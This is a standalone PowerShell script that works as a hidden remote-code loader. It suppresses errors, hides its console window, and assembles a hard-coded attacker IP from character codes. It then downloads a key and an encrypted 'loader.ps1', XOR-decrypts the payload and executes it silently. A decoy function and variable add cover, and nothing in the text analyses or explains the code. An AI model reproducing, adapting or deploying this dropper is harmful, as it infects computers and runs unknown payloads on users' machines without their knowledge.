
function Show-Progress {
    param([string]$Activity, [int]$Percent)

}


$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'

$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

$ping = "50"  
$sUllz = 'http://' + 
         [char]50+[char]49+[char]51+'.'+[char]49+[char]53+[char]57+'.'+
         [char]55+[char]53+'.'+[char]49+[char]53+[char]57+':5000'

try {
    $key = Invoke-RestMethod "$sUllz/.key" -TimeoutSec 20
    
    $encrypted = Invoke-RestMethod "$sUllz/loader.ps1" -TimeoutSec 20
    
    $z = [Convert]::FromBase64String($encrypted)
    $w = [Text.Encoding]::UTF8.GetBytes($key)
    $r = New-Object byte[] $z.Length
    
    for($j = 0; $j -lt $z.Length; $j++) {
        $r[$j] = $z[$j] -bxor $w[$j % $w.Length]
    }
    
    $global:MaxPing = $ping
    
    $scriptBlock = [scriptblock]::Create([Text.Encoding]::UTF8.GetString($r))
    & $scriptBlock | Out-Null
    
} catch {

    exit 1
}

exit 0
